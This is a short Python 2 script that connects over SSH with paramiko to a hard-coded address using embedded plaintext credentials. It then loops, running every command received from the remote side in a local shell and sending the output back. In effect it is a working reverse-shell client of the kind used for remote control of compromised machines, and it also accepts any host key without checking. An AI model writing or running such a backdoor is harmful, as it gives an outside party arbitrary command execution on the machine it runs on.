#-*- coding: utf-8 -*-
import paramiko
import threading
import subprocess

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	# client.load_host_keys('./known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username=user,port=29, password=passwd)
	ssh_session = client.get_transport().open_session()

	if ssh_session.active:
		ssh_session.send(command)
		print ssh_session.recv(4096)
	while 1:
		command = ssh_session.recv(1024)
		try:
			cmd_output = subprocess.check_output(command, shell=True)
			ssh_session.send(cmd_output)
		except Exception, e:
			ssh_session.send(str(e))
	client.close()
	return
ssh_command('172.24.1.1', 'pi', 'hadoop', 'ClinetConnected')